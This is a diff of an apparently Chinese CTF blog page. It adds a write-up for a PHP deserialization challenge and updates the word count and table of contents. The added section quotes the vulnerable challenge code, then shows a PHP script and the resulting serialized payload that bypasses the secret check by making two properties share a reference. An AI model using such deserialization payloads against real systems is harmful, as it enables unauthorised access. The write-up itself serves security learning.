@@ -267,7 +267,7 @@ height:50vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">3,452</span> / Reading time: <span class="post-count">15 min</span></span>
+                        <span>Word count: <span class="post-count">3,680</span> / Reading time: <span class="post-count">16 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -603,7 +603,46 @@ else
 <pre><code>?user1=YWRtaW4=
 [post data]
 user=admin
-</code></pre><h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>右键查看源代码，获得源码</p>
+</code></pre><h1 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h1><p>做的时候这题显示的是暂时不可做，但是很想做关于反序列化的题，就在网上找了一下这题的wp，结果意外的发现了该题的源代码。倒是可以在本地复现 <br><br>云做题 <br></p>
+<pre><code>&lt;?php
+class just4fun {
+    var $enter;
+    var $secret;
+}
+
+if (isset($_GET[&apos;pass&apos;])) {
+    $pass = $_GET[&apos;pass&apos;];
+
+    if(get_magic_quotes_gpc()){
+        $pass=stripslashes($pass);
+    }
+
+    $o = unserialize($pass);
+
+    if ($o) {
+        $o-&gt;secret = &quot;*&quot;;
+        if ($o-&gt;secret === $o-&gt;enter)
+            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
+        else 
+            echo &quot;Oh no... You can&apos;t fool me&quot;;
+    }
+    else echo &quot;are you trolling?&quot;;
+?&gt;
+</code></pre><p>大致的题意就是在把输入的值反序列化之后，会给secret重新赋一次值，这个值是未知的，估计是flag，之后要求sercet和enter相等即可绕过 <br><br>只要将sercet的值引用赋值给enter即可 <br></p>
+<pre><code>&lt;?php
+class just4fun {
+    var $enter;
+    var $secret;
+}
+
+$JuH0n = new just4fun();
+$JuH0n -&gt; enter = &amp;$JuH0n -&gt; secret;
+$pass = serialize($JuH0n);
+print_r($pass);
+?&gt;
+//O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;} 
+</code></pre><p>用pass传入即可绕过</p>
+<h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><p>右键查看源代码，获得源码</p>
 <pre><code>&lt;!--
 #GOAL: login as admin,then get the flag;
 error_reporting(0);
@@ -833,7 +872,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#签到题"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5-collision"><span class="toc-number">2.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#签到2"><span class="toc-number">3.</span> <span class="toc-text">签到2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#这题不是web"><span class="toc-number">4.</span> <span class="toc-text">这题不是web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#层层递进"><span class="toc-number">5.</span> <span class="toc-text">层层递进</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AAencode"><span class="toc-number">6.</span> <span class="toc-text">AAencode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单身二十年"><span class="toc-number">7.</span> <span class="toc-text">单身二十年</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-decode"><span class="toc-number">8.</span> <span class="toc-text">php decode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#本地包含"><span class="toc-number">9.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单身一百年也没用"><span class="toc-number">10.</span> <span class="toc-text">单身一百年也没用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#COOKIE"><span class="toc-number">11.</span> <span class="toc-text">COOKIE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">12.</span> <span class="toc-text">MYSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GBK-Injection"><span class="toc-number">13.</span> <span class="toc-text">GBK Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x00"><span class="toc-number">14.</span> <span class="toc-text">/x00</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass-again"><span class="toc-number">15.</span> <span class="toc-text">bypass again</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#上传绕过"><span class="toc-number">16.</span> <span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入1"><span class="toc-number">17.</span> <span class="toc-text">sql注入1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pass-check"><span class="toc-number">18.</span> <span class="toc-text">pass check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#起名字真难"><span class="toc-number">19.</span> <span class="toc-text">起名字真难</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#密码重置"><span class="toc-number">20.</span> <span class="toc-text">密码重置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">21.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#综合题"><span class="toc-number">22.</span> <span class="toc-text">综合题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入2"><span class="toc-number">23.</span> <span class="toc-text">SQL注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#综合题2"><span class="toc-number">24.</span> <span class="toc-text">综合题2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#密码重置2"><span class="toc-number">25.</span> <span class="toc-text">密码重置2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-get-contents"><span class="toc-number">26.</span> <span class="toc-text">file_get_contents</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#变量覆盖"><span class="toc-number">27.</span> <span class="toc-text">变量覆盖</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#签到题"><span class="toc-number">1.</span> <span class="toc-text">签到题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#md5-collision"><span class="toc-number">2.</span> <span class="toc-text">md5 collision</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#签到2"><span class="toc-number">3.</span> <span class="toc-text">签到2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#这题不是web"><span class="toc-number">4.</span> <span class="toc-text">这题不是web</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#层层递进"><span class="toc-number">5.</span> <span class="toc-text">层层递进</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#AAencode"><span class="toc-number">6.</span> <span class="toc-text">AAencode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单身二十年"><span class="toc-number">7.</span> <span class="toc-text">单身二十年</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-decode"><span class="toc-number">8.</span> <span class="toc-text">php decode</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#本地包含"><span class="toc-number">9.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#单身一百年也没用"><span class="toc-number">10.</span> <span class="toc-text">单身一百年也没用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#COOKIE"><span class="toc-number">11.</span> <span class="toc-text">COOKIE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MYSQL"><span class="toc-number">12.</span> <span class="toc-text">MYSQL</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GBK-Injection"><span class="toc-number">13.</span> <span class="toc-text">GBK Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#x00"><span class="toc-number">14.</span> <span class="toc-text">/x00</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass-again"><span class="toc-number">15.</span> <span class="toc-text">bypass again</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#上传绕过"><span class="toc-number">16.</span> <span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql注入1"><span class="toc-number">17.</span> <span class="toc-text">sql注入1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pass-check"><span class="toc-number">18.</span> <span class="toc-text">pass check</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#起名字真难"><span class="toc-number">19.</span> <span class="toc-text">起名字真难</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#密码重置"><span class="toc-number">20.</span> <span class="toc-text">密码重置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php反序列化"><span class="toc-number">21.</span> <span class="toc-text">php反序列化</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">22.</span> <span class="toc-text">SQL Injection</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#综合题"><span class="toc-number">23.</span> <span class="toc-text">综合题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL注入2"><span class="toc-number">24.</span> <span class="toc-text">SQL注入2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#综合题2"><span class="toc-number">25.</span> <span class="toc-text">综合题2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#密码重置2"><span class="toc-number">26.</span> <span class="toc-text">密码重置2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-get-contents"><span class="toc-number">27.</span> <span class="toc-text">file_get_contents</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#变量覆盖"><span class="toc-number">28.</span> <span class="toc-text">变量覆盖</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
